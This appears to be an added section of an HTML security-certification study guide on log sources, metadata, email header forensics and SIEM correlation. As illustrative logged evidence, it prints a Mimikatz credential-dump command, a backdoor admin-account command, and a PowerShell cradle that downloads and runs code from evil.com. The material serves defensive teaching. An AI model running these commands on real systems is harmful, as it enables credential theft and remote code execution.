+<span class="cm"># PowerShell logging — critical to enable for investigations:</span>
+
+<span class="cb">Script Block Logging (Event 4104):</span>
+  Logs the CONTENT of every PowerShell script block executed
+  Even obfuscated scripts → decoded and logged
+
+Example — without script block logging:
+  Event 4688: powershell.exe -enc SQBtAHAAbwByAHQA...
+  Investigation: <span class="cr">"we can see PowerShell ran but not what it did"</span>
+
+Example — with script block logging (Event 4104):
+  Script block contents decoded:
+  Import-Module Mimikatz
+  Invoke-Mimikatz -Command "sekurlsa::logonpasswords"
+  <span class="cr">= Credential dumping confirmed — full command visible</span>
+
+<span class="cb">Module Logging (Event 4103):</span>
+  Logs every command and its output
+  Shows what PowerShell DID not just what it ran
+
+<span class="cb">Transcription Logging:</span>
+  Saves complete transcript to text file
+  Captures: everything typed in PS console + output
+
+<span class="cm"># Enable via Group Policy:</span>
+Computer Config → Admin Templates → Windows Components
+→ Windows PowerShell → Turn on Script Block Logging: ENABLED
+    </div>
+
+    <h3>Command Line Auditing</h3>
+    <div class="code">
+<span class="cm"># Without command line auditing — Event 4688 is nearly useless:</span>
+Process: cmd.exe | PID: 4847 | User: sarah.chen
+<span class="cr">No command line — what did cmd.exe DO?</span>
+
+<span class="cg"># With command line auditing — Event 4688 reveals everything:</span>
+Process: cmd.exe | PID: 4847 | User: sarah.chen
+CommandLine: cmd.exe /c "net user backdoor Password123 /add
+             && net localgroup administrators backdoor /add"
+<span class="cr">= Backdoor account creation — caught!</span>
+
+<span class="cm"># Enable via Group Policy:</span>
+Computer Config → Policies → Windows Settings → Security Settings
+→ Advanced Audit Policy → Detailed Tracking
+→ Audit Process Creation: Enable + include command line
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — Sysmon Reconstructs Fileless Attack</div>
+      <div class="code">
+<span class="cm"># Fileless malware — no file on disk — traditional AV blind</span>
+<span class="cm"># Sysmon Event 1 (process creation) tells the whole story:</span>
+
+<span class="ci">T+0</span>: <span class="co">Sysmon Event 1</span>
+  ParentImage: WINWORD.EXE (Word document opened)
+  Image:       powershell.exe
+  CommandLine: powershell -w hidden -nop -enc
+               JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUA...
+  <span class="cr">Word spawning hidden PowerShell = macro malware</span>
+
+<span class="ci">T+2s</span>: <span class="co">Sysmon Event 1 (decoded script block — Event 4104)</span>
+  $client = New-Object System.Net.WebClient
+  $payload = $client.DownloadString("http://evil.com/stage2.ps1")
+  IEX($payload)  ← execute downloaded code in memory
+
+<span class="ci">T+4s</span>: <span class="co">Sysmon Event 3</span> (network connection)
+  Image: powershell.exe
+  DestinationIp: 185.220.101.34
+  DestinationPort: 443
+
+<span class="ci">T+6s</span>: <span class="co">Sysmon Event 10</span> (process access)
+  SourceImage: powershell.exe
+  TargetImage: lsass.exe ← <span class="cr">credential dumping attempt!</span>
+  GrantedAccess: 0x1010
+
+<span class="cg">Complete fileless attack chain from Sysmon alone ✓</span>
+<span class="cg">No files on disk — all evidence in logs ✓</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">Sysmon →</span><span>Free enhanced Windows logging — process trees, network connections, registry — essential</span></div>
+      <div class="er"><span class="ek">Sysmon Event 1 →</span><span>Process creation with full command line, parent, hash</span></div>
+      <div class="er"><span class="ek">Sysmon Event 10 →</span><span>Process access (LSASS) — credential dumping detection</span></div>
+      <div class="er"><span class="ek">Event 4104 →</span><span>PowerShell script block logging — records decoded script content</span></div>
+      <div class="er"><span class="ek">Command line auditing →</span><span>Must enable explicitly — without it, Process Creation events are useless</span></div>
+      <div class="er"><span class="ek">EDR telemetry →</span><span>Most comprehensive — behavioral, fileless detection, threat intel correlation</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 7. METADATA & CONTEXT     -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s7">
+<div class="card">
+  <div class="card-hd"><span class="card-num">07</span><span class="card-title">Metadata & Contextual Data Sources</span><span class="bdg bdg-yellow">File · Email · Image · Context</span></div>
+  <div class="card-bd">
+    <p>Metadata is <strong style="color:var(--text)">"data about data"</strong> — information that describes, explains, or gives context to other data. For investigations, metadata often provides the crucial context that turns a suspicious event into a confirmed incident.</p>
+
+    <h3>File Metadata — What Files Tell You</h3>
+    <div class="code">
+<span class="cm"># File metadata reveals information beyond the content:</span>
+
+Windows file properties (NTFS):
+  Created:    2024-03-15 02:14:33
+  Modified:   2024-03-15 02:47:12
+  Accessed:   2024-03-15 03:01:44
+  Author:     "Attacker Workstation" ← <span class="cr">document property from attacker's PC</span>
+  Company:    "Evil Corp"
+  Last saved: by user "hax0r"
+
+<span class="cm"># Timestamps reveal attacker actions:</span>
+malware.exe Created: 02:14:33  ← dropper deployed
+malware.exe Modified: 02:14:33  ← same = freshly created
+config.dat Created: 02:15:01  ← config file created after malware
+loot.zip Created: 03:47:22  ← 90 min later = data staged for exfil
+
+<span class="cm"># MACB timestamps (Forensic Quadruple):</span>
+M = Modified (content last changed)
+A = Accessed (file last read)
+C = Changed (metadata/MFT changed)
+B = Born ($STANDARD_INFORMATION created)
+
+Timestamp manipulation:
+  Attacker can change MAC timestamps with timestomp
+  B (born) timestamp harder to fake
+  MFT entry timestamp vs $STANDARD_INFORMATION discrepancy
+  <span class="cm">= timestomping detected!</span>
+    </div>
+
+    <h3>Email Header Analysis</h3>
+    <div class="code">
+<span class="cm"># Email headers contain a wealth of investigation data:</span>
+
+Received: from mail.spoofed-domain.com (185.220.101.34)
+  by mx.company.com with ESMTP id abc123
+  2024-03-15 14:23:47 UTC
+
+<span class="cm"># Each "Received:" hop adds network path — trace the route</span>
+From: "CEO Name" &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3f5c5a507f5c50524f5e5146115c5052">[email&#160;protected]</a>&gt;
+  ACTUAL sender: forged — check Return-Path and DKIM
+
+Return-Path: &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f9988d8d989a929c8bb99c8f9095d79a9694">[email&#160;protected]</a>&gt;  ← <span class="cr">actual return address</span>
+X-Originating-IP: 185.220.101.34  ← <span class="cr">sender's real IP</span>
+
+Authentication:
+  SPF: FAIL  ← <span class="cr">sending IP not authorized for domain</span>
+  DKIM: FAIL ← <span class="cr">message not signed by legitimate sender</span>
+  DMARC: FAIL → reject/quarantine should apply
+
+<span class="cm"># Email header investigation reveals:</span>
+Is this really from who it claims? (SPF/DKIM)
+What path did it travel? (Received headers)
+What's the real sender IP? (X-Originating-IP)
+Was it modified in transit? (DKIM signature)
+When exactly was it sent? (Date header + timestamps)
+    </div>
+
+    <h3>Image EXIF Metadata</h3>
+    <div class="code">
+<span class="cm"># Images contain hidden metadata — EXIF data:</span>
+Photo taken with: iPhone 15 Pro
+Camera make/model: Apple iPhone 15 Pro
+Date/Time: 2024-03-15 02:14:33 ← <span class="cr">3am (insider leaking after hours?)</span>
+GPS Latitude:  37.7749° N  ← <span class="cr">San Francisco</span>
+GPS Longitude: 122.4194° W ← <span class="cr">claimed to be in London!</span>
+Software: iOS 17.2.1
+
+<span class="cm"># Investigation use cases:</span>
+Photo leaked from confidential meeting:
+  EXIF shows: taken on iPhone 12 model X4847
+  Corporate MDM: device X4847 belongs to John Smith
+  <span class="cr">John Smith leaked the photo</span>
+
+Malware sample analysis:
+  Document metadata: last edited by "hacker_workstation"
+  Company: "Fancy Bear" ← <span class="cr">APT group attribution clue</span>
+  Language: Russian (spelling suggestions)
+    </div>
+
+    <h3>Other Contextual Data Sources</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--teal)">Physical / Badge Access Logs</h4>
+        <p>Building access system records: who entered/exited what area and when. Correlate with: network login times (should match physical presence), data center access before equipment went missing, alibi confirmation or contradiction. "The logs say John was in the data center at 3am but he claims he was home asleep."</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--blue)">CCTV / Video</h4>
+        <p>Physical surveillance footage. Corroborates badge access logs. Identifies who plugged in a USB device. Shows who was present when equipment was accessed. Metadata: timestamp, camera ID, resolution. Must be collected quickly — often overwritten after 30-90 days.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">OSINT — Open Source Intelligence</h4>
+        <p>Publicly available information useful in investigations. Shodan (internet device discovery), WHOIS records, social media, job postings (reveals technology stack), breach databases, threat actor forums (dark web with caution), certificate transparency logs.</p>
+        <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+Shodan: "org:TargetCompany port:3389 open"
+  → finds exposed RDP servers
+WHOIS: when was malicious domain registered?
+  → new domain (1 day old) = suspicious
+Certs: Certificate Transparency logs
+  → find all subdomains of target
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Threat Intelligence Feeds</h4>
+        <p>External context enriching internal logs. IOC feeds: known-bad IPs, domains, hashes. MITRE ATT&CK technique context. CISA KEV — actively exploited CVEs. ISAC feeds (industry-specific). VirusTotal, Shodan, AbuseIPDB APIs for enrichment.</p>
+      </div>
+    </div>
+
+    <h3>Time Synchronization — Why It Matters</h3>
+    <div class="code">
+<span class="cm"># Investigation disaster — time not synchronized:</span>
+
+Server A clock: 14:32:15 (EST)
+Server B clock: 14:35:47 (EST — 3.5 min fast)
+Firewall clock: 14:30:02 (EST — 2 min slow)
+
+Attack timeline investigation:
+  "Firewall: connection from 14:30:02"
+  "Server B: user logged in at 14:35:47"
+  Question: "Did the connection happen BEFORE or AFTER login?"
+  Answer: <span class="cr">impossible to determine — clocks unsynchronized</span>
+
+<span class="cg">With NTP (all clocks synchronized):</span>
+  Firewall: connection at 14:32:15
+  Server B: login at 14:32:16 (1 second later)
+  <span class="cg">Clear: connection triggered login = lateral movement confirmed</span>
+
+<span class="cm"># NTP — Network Time Protocol:</span>
+Port: UDP 123
+Source: authoritative NTP server (NIST, pool.ntp.org)
+All systems: sync to same source
+Investigation: timestamps are reliable and correlatable
+
+<span class="cm"># Log correlation requires synchronized time</span>
+<span class="cm"># Time skew of even 1 minute destroys investigation quality</span>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">MACB timestamps →</span><span>Modified, Accessed, Changed, Born — file system timestamp forensics</span></div>
+      <div class="er"><span class="ek">Timestomping →</span><span>Attacker manipulates file timestamps — Born timestamp harder to fake</span></div>
+      <div class="er"><span class="ek">Email headers →</span><span>SPF/DKIM/DMARC results, originating IP, routing path — phishing investigation</span></div>
+      <div class="er"><span class="ek">EXIF metadata →</span><span>Image contains GPS, device, timestamp — reveals who/where/when</span></div>
+      <div class="er"><span class="ek">OSINT →</span><span>Shodan, WHOIS, cert transparency, breach data — external investigation context</span></div>
+      <div class="er"><span class="ek">NTP →</span><span>Time synchronization — UDP 123 — essential for log correlation across systems</span></div>
+      <div class="er"><span class="ek">Badge/CCTV →</span><span>Physical logs corroborate or contradict digital timeline</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 8. SIEM CORRELATION       -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s8">
+<div class="card">
+  <div class="card-hd"><span class="card-num">08</span><span class="card-title">SIEM — Correlating All Data Sources</span><span class="bdg bdg-indigo">Aggregate · Correlate · Investigate</span></div>
+  <div class="card-bd">
+    <p>SIEM (Security Information and Event Management) is the <strong style="color:var(--text)">central platform that aggregates all data sources and enables correlation</strong> — finding patterns across hundreds of systems that no analyst could see manually. The value of SIEM multiplies with each new data source connected.</p>
+
+    <h3>How SIEM Transforms Raw Logs into Investigations</h3>
+    <div class="code">
+<span class="cm"># Individual log entries — each looks harmless alone:</span>
+
+DNS log:      10.0.1.47 queried evil-c2.ru at 02:14:31
+Firewall log: 10.0.1.47 → 185.220.x.x:443 ALLOWED at 02:14:33
+DHCP log:     10.0.1.47 = LAPTOP-SARAH (MAC: aa:bb:cc:dd)
+AD log:       sarah.chen logged in to LAPTOP-SARAH at 09:14 (normal)
+EDR log:      LAPTOP-SARAH: powershell.exe spawned from word.exe 02:14:29
+Proxy log:    sarah.chen downloaded invoice.doc at 14:23:47 (previous day)
+
+<span class="cm"># SIEM correlates all of these → single investigation view:</span>
+
+<span class="cr">SIEM ALERT: Possible Malware — LAPTOP-SARAH / sarah.chen</span>
+
+Timeline:
+  14:23:47 — Sarah downloaded suspicious .doc
+  02:14:29 — Word spawned PowerShell (macro executed overnight)
+  02:14:31 — DNS query to known malicious domain
+  02:14:33 — Connection established to C2 server
+  
+  Attack chain: phishing doc → macro → PowerShell → C2
+  Affected: sarah.chen / LAPTOP-SARAH
+  C2: 185.220.x.x (Netherlands) — Tor infrastructure
+  
+  Recommended actions: [Isolate endpoint] [Lock account] [Create ticket]
+  
+<span class="cg">6 separate log entries → 1 clear attack narrative ✓</span>
+    </div>
+
+    <h3>SIEM Investigation Workflow</h3>
+    <div class="flow">
+      <div class="flow-box" style="background:#e0e7ff;border-color:#a5b4fc;color:#3730a3">Alert fires</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#dbeafe;border-color:#93c5fd;color:#1e40af">Pivot to timeline</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#dcfce7;border-color:#86efac;color:#166534">Add context</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#ffedd5;border-color:#fdba74;color:#9a3412">Expand scope</div>
+      <span class="flow-arr">→</span>
+      <div class="flow-box" style="background:#fee2e2;border-color:#fca5a5;color:#991b1b">Confirm + respond</div>
+    </div>
+
+    <h3>Key SIEM Investigation Techniques</h3>
+    <div class="g2">
+      <div class="gc">
+        <h4 style="color:var(--blue)">Pivoting</h4>
+        <p>Start with one indicator and pivot to related data. IP address in alert → pivot to all connections from that IP → pivot to other hosts that connected to same C2 → find all infected hosts. Each pivot reveals more scope.</p>
+        <div class="code" style="font-size:0.63rem;margin-top:0.5rem">
+Start: Alert on 10.0.1.47 → C2 traffic
+Pivot 1: What else did 10.0.1.47 connect to?
+  → Found lateral movement to 10.0.2.33
+Pivot 2: What other hosts connected to C2?
+  → Found 10.0.3.55 also infected
+Pivot 3: What user is on 10.0.3.55?
+  → DHCP: sarah.chen — scope found
+        </div>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--green)">Timeline Analysis</h4>
+        <p>Build chronological view of all events related to an incident. Identify: when did it start (patient zero), how long undetected (dwell time), sequence of attacker actions, what was affected and when, are there events before what we think is the start.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--orange)">Baseline Deviation</h4>
+        <p>Compare current activity to historical baseline. "User sarah.chen normally downloads 50MB/day — today she downloaded 47GB." UEBA builds these baselines automatically and flags deviations as alerts. Most effective for insider threats.</p>
+      </div>
+      <div class="gc">
+        <h4 style="color:var(--purple)">Field Extraction & Parsing</h4>
+        <p>SIEM normalizes different log formats into common schema. Apache logs, Windows events, firewall logs — all have different formats but SIEM maps them to common fields. src_ip, dst_ip, user, action — consistent across all sources.</p>
+      </div>
+    </div>
+
+    <h3>Data Source Coverage Matrix — What You Need for What Threat</h3>
+    <div style="overflow-x:auto;margin:1rem 0">
+    <table>
+      <tr><th>Threat</th><th>Primary Source</th><th>Secondary Source</th><th>What to Look For</th></tr>
+      <tr><td>Phishing / Malware</td><td><span class="tag to">Email gateway logs</span></td><td><span class="tag tb">DNS + Proxy</span></td><td>Delivered email, C2 callback, payload download</td></tr>
+      <tr><td>Credential theft</td><td><span class="tag tb">AD/IAM logs (4624/4625)</span></td><td><span class="tag tp">Sysmon Event 10</span></td><td>LSASS access, failed logins, new admin accounts</td></tr>
+      <tr><td>Lateral movement</td><td><span class="tag tg">Firewall logs</span></td><td><span class="tag tb">AD (4648, 4624 type 3)</span></td><td>Internal east-west connections, PsExec, SMB</td></tr>
+      <tr><td>Data exfiltration</td><td><span class="tag tg">NetFlow + firewall</span></td><td><span class="tag to">Proxy + DLP logs</span></td><td>Large outbound transfers, cloud uploads, DNS tunneling</td></tr>
+      <tr><td>Ransomware</td><td><span class="tag tt">EDR telemetry</span></td><td><span class="tag tg">File system logs</span></td><td>Mass file modification, shadow copy deletion, C2</td></tr>
+      <tr><td>Insider threat</td><td><span class="tag tb">DLP + IAM logs</span></td><td><span class="tag tg">File access + proxy</span></td><td>After-hours access, bulk download, unusual destinations</td></tr>
+      <tr><td>Cloud compromise</td><td><span class="tag to">CloudTrail / Activity Log</span></td><td><span class="tag tp">IAM logs</span></td><td>Root login, new admin, resource creation, billing spike</td></tr>
+      <tr><td>Web app attack</td><td><span class="tag to">Web server logs</span></td><td><span class="tag tr">WAF + DB logs</span></td><td>SQLi patterns, error spikes, web shell access</td></tr>
+    </table>
+    </div>
+
+    <div class="scene">
+      <div class="scene-lbl">// Scenario — Full Investigation from Multiple Data Sources</div>
+      <div class="code">
+<span class="cm"># Business Email Compromise (BEC) investigation:</span>
+<span class="cm"># Finance received fake CEO email — $2M wire requested</span>
+
+<span class="cb">Step 1 — Email gateway logs:</span>
+  Message-ID: &lt;<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="28494a4b191a1b684b474558494651054b4d4706464d5c">[email&#160;protected]</a>&gt; (NOT company.com!)
+  SPF: FAIL | DKIM: FAIL | DMARC: policy=reject → <span class="cr">should have been blocked!</span>
+  Gateway: <span class="cr">delivered anyway (misconfigured DMARC!)</span>
+  Sender IP: 185.220.x.x
+
+<span class="cb">Step 2 — Email header analysis:</span>
+  Received: from mail.company-ceo.net (not company.com)
+  X-Originating-IP: 91.108.4.x (Bulgaria)
+  Reply-To: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="167573794966776f7b7378626556717b777f7a3875797b">[email&#160;protected]</a> ← <span class="cr">Gmail for payments? Red flag</span>
+
+<span class="cb">Step 3 — IAM/SSO logs:</span>
+  Did attacker access CEO's real email account?
+  Real CEO: no unusual logins — account NOT compromised
+  Attack type: pure social engineering — no system compromise
+
+<span class="cb">Step 4 — Domain investigation (WHOIS/OSINT):</span>
+  company-ceo.net: registered 2024-03-14 (YESTERDAY!)
+  Registrar: NameCheap (anonymous)
+  Lookalike domain for social engineering
+
+<span class="cb">Step 5 — DNS logs:</span>
+  Finance user visited: wire-transfer-form.company-ceo.net
+  <span class="cr">Follow-up phishing site visited by victim!</span>
+
+<span class="cb">Step 6 — Threat intel enrichment:</span>
+  185.220.x.x: known BEC infrastructure (AbuseIPDB)
+  91.108.4.x: associated with TA505 threat group
+
+<span class="cg">Complete picture from 5 data sources:</span>
+<span class="cg">Lookalike domain + spoofed email + failed DMARC + BEC group ✓</span>
+<span class="cg">DMARC misconfiguration: root cause — fix immediately</span>
+      </div>
+    </div>
+
+    <div class="exam">
+      <h4>// Exam Keywords</h4>
+      <div class="er"><span class="ek">SIEM value →</span><span>Correlates logs from all sources — finds patterns no single source reveals</span></div>
+      <div class="er"><span class="ek">Pivoting →</span><span>Start with one indicator, pivot to related data to expand investigation scope</span></div>
+      <div class="er"><span class="ek">Timeline analysis →</span><span>Chronological view of all events — reveals attack chain and dwell time</span></div>
+      <div class="er"><span class="ek">Log normalization →</span><span>SIEM maps different log formats to common schema — enables correlation</span></div>
+      <div class="er"><span class="ek">Data source coverage →</span><span>Different threats require different log sources — gaps = blind spots</span></div>
+    </div>
+  </div>
+</div>
+</div>
+
+<!-- ══════════════════════════ -->
+<!-- 9. SUMMARY                -->
+<!-- ══════════════════════════ -->
+<div class="sec" id="s9">
+<div class="card">
+  <div class="card-hd"><span class="card-num">09</span><span class="card-title">Complete Summary — Exam Cheat Sheet</span><span class="bdg bdg-indigo">All Data Sources</span></div>
+  <div class="card-bd">
+
+    <h3>Data Sources Quick Reference</h3>
+    <div style="overflow-x:auto;margin-bottom:1.5rem">
+    <table>
+      <tr><th>Source</th><th>What It Contains</th><th>Key Investigation Use</th><th>Tool/Location</th></tr>
+      <tr><td><span class="tag tb">Windows Event Log</span></td><td>Auth, process, policy changes</td><td>Login investigation, privilege escalation</td><td>Event Viewer, Splunk, SIEM</td></tr>
+      <tr><td><span class="tag tg">Sysmon</span></td><td>Process trees, network, registry</td><td>Malware analysis, fileless attacks</td><td>Free Sysinternals tool</td></tr>
+      <tr><td><span class="tag tt">Linux Syslog</span></td><td>Auth, sudo, system messages</td><td>SSH intrusion, privilege escalation</td><td>/var/log/auth.log, secure</td></tr>
+      <tr><td><span class="tag tg">Firewall Logs</span></td><td>Allow/deny connection records</td><td>C2 detection, data exfiltration volume</td><td>Palo Alto, Fortinet, pfSense</td></tr>
+      <tr><td><span class="tag tt">NetFlow/IPFIX</span></td><td>Traffic metadata — no content</td><td>Exfil by volume, beaconing, lateral mvmt</td><td>SolarWinds NTA, ntopng</td></tr>
+      <tr><td><span class="tag to">DNS Logs</span></td><td>Domain resolution records</td><td>C2 domains, DGA, DNS tunneling</td><td>DNS server, Umbrella</td></tr>
+      <tr><td><span class="tag tp">PCAP</span></td><td>Full packet content</td><td>Reconstruct attack, see data exfiltrated</td><td>Wireshark, tcpdump</td></tr>
+      <tr><td><span class="tag tg">DHCP Logs</span></td><td>IP→hostname→MAC mapping</td><td>Identify which device had an IP at time X</td><td>DHCP server logs</td></tr>
+      <tr><td><span class="tag ts">Proxy Logs</span></td><td>Web requests by user</td><td>Malware downloads, policy violations</td><td>Zscaler, Bluecoat, Squid</td></tr>
+      <tr><td><span class="tag to">Web Server Logs</span></td><td>HTTP request records</td><td>Web attacks, web shells, SQLi</td><td>Apache, Nginx, IIS</td></tr>
+      <tr><td><span class="tag tr">Database Logs</span></td><td>Query audit records</td><td>SQL injection, bulk export, xp_cmdshell</td><td>SQL Server audit, MySQL general log</td></tr>
+      <tr><td><span class="tag tp">Email Logs</span></td><td>Message tracking records</td><td>Phishing, BEC, exfil via email</td><td>Exchange, O365 UAL</td></tr>
+      <tr><td><span class="tag tg">VPN Logs</span></td><td>Remote connection records</td><td>Impossible travel, after-hours access</td><td>Cisco ASA, Palo Alto GlobalProtect</td></tr>
+      <tr><td><span class="tag to">CloudTrail</span></td><td>AWS API calls</td><td>Root login, resource creation, exfil</td><td>AWS CloudTrail console</td></tr>
+      <tr><td><span class="tag tb">Azure Activity Log</span></td><td>Azure control plane ops</td><td>Resource changes, security group mods</td><td>Azure Monitor, Sentinel</td></tr>
+      <tr><td><span class="tag tp">M365 Unified Audit</span></td><td>All M365 activity</td><td>Email rules, file access, Teams activity</td><td>Compliance center / SIEM</td></tr>
+    </table>
+    </div>
+
+    <h3>Windows Event IDs — Essential Cheat Sheet</h3>
+    <div style="overflow-x:auto;margin-bottom:1.5rem">
+    <table>
+      <tr><th>Event ID</th><th>Event Name</th><th>Why It Matters</th><th>Threat</th></tr>
+      <tr><td><span class="tag tb">4624</span></td><td>Successful Logon</td><td>Track all logins — type 3=network, 10=RDP</td><td><span class="tag tg">Baseline</span></td></tr>
+      <tr><td><span class="tag tr">4625</span></td><td>Failed Logon</td><td>Brute force and spray detection</td><td><span class="tag tr">Brute force</span></td></tr>
+      <tr><td><span class="tag tr">4648</span></td><td>Explicit Credential Logon</td><td>Pass-the-hash, lateral movement</td><td><span class="tag tr">PtH attack</span></td></tr>
+      <tr><td><span class="tag tp">4672</span></td><td>Special Privileges</td><td>Admin logon — monitor closely</td><td><span class="tag tp">Privilege use</span></td></tr>
+      <tr><td><span class="tag tp">4768</span></td><td>Kerberos TGT Request</span></td><td>Kerberoasting baseline</td><td><span class="tag tp">Kerberos</span></td></tr>
+      <tr><td><span class="tag tp">4769</span></td><td>Kerberos Service Ticket</td><td>Kerberoasting — bulk RC4 requests</td><td><span class="tag tr">Kerberoasting</span></td></tr>
+      <tr><td><span class="tag tr">4719</span></td><td>Audit Policy Changed</td><td>Attacker disabling logs — CRITICAL</td><td><span class="tag tr">Cover tracks</span></td></tr>
+      <tr><td><span class="tag tr">4720</span></td><td>Account Created</td><td>Backdoor account creation</td><td><span class="tag tr">Persistence</span></td></tr>
+      <tr><td><span class="tag tr">4732</span></td><td>Added to Security Group</td><td>Privilege escalation</td><td><span class="tag tr">Escalation</span></td></tr>
+      <tr><td><span class="tag tr">4698</span></td><td>Scheduled Task Created</td><td>Persistence mechanism</td><td><span class="tag tr">Persistence</span></td></tr>
+      <tr><td><span class="tag to">4688</span></td><td>Process Created</td><td>Process execution — needs cmd-line logging</td><td><span class="tag to">Execution</span></td></tr>
+      <tr><td><span class="tag tr">7045</span></td><td>New Service Installed</td><td>Malware service persistence</td><td><span class="tag tr">Persistence</span></td></tr>
+    </table>
+    </div>
+
+    <h3>Scenario → Answer Cheat Sheet</h3>
+    <div class="exam" style="margin:0">
+      <h4>// Exam Scenarios → Answers</h4>
+      <div class="er"><span class="ek">"Most important reason to collect logs before incident"</span><span>→ Can't add logging retroactively — data must exist before you need it</span></div>
+      <div class="er"><span class="ek">"Attacker deleted local logs — how to investigate?"</span><span>→ Centralized SIEM already received them — unaffected by local deletion</span></div>
+      <div class="er"><span class="ek">"Which log maps IP address to hostname at specific time?"</span><span>→ DHCP logs — IP lease assignments with timestamps</span></div>
+      <div class="er"><span class="ek">"Traffic metadata without actual content"</span><span>→ NetFlow/IPFIX — who talked to whom, how much, when</span></div>
+      <div class="er"><span class="ek">"Full packet capture — see actual data transferred"</span><span>→ PCAP — Wireshark — highest investigation value, highest storage cost</span></div>
+      <div class="er"><span class="ek">"Detect C2 by regular connection intervals"</span><span>→ NetFlow beaconing analysis — same interval = automated C2</span></div>
+      <div class="er"><span class="ek">"Detect data in DNS query names"</span><span>→ DNS logs — unusually long subdomains = DNS tunneling exfiltration</span></div>
+      <div class="er"><span class="ek">"Failed login × 5 then success — which event IDs?"</span><span>→ 4625 (×5 failed) then 4624 (success)</span></div>
+      <div class="er"><span class="ek">"Attacker disabled Windows auditing"</span><span>→ Event ID 4719 — Audit Policy Changed — CRITICAL alert</span></div>
+      <div class="er"><span class="ek">"New backdoor admin account created"</span><span>→ Event ID 4720 (created) + 4732 (added to Admins group)</span></div>
+      <div class="er"><span class="ek">"Full PowerShell command content in logs"</span><span>→ PowerShell Script Block Logging (Event 4104) — must enable explicitly</span></div>
+      <div class="er"><span class="ek">"Free tool adding process trees and network events to Windows"</span><span>→ Sysmon (Sysinternals) — Event 1 = process, Event 3 = network</span></div>
+      <div class="er"><span class="ek">"LSASS access for credential dumping detection"</span><span>→ Sysmon Event 10 — process access targeting lsass.exe</span></div>
+      <div class="er"><span class="ek">"Every AWS API call logged — who did what"</span><span>→ AWS CloudTrail</span></div>
+      <div class="er"><span class="ek">"CloudTrail disabled by attacker"</span><s
